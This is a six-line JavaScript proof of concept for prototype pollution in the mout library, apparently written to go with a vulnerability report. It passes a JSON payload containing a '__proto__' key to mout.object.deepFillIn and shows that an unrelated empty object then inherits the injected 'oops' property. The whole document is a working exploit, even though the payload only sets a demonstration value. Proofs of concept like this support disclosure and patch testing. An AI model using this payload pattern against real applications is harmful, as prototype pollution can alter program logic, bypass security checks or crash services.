let mout = require("mout");
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
a = {};
console.log(a.oops);
mout.object.deepFillIn({}, JSON.parse(malicious_payload));
console.log(a.oops);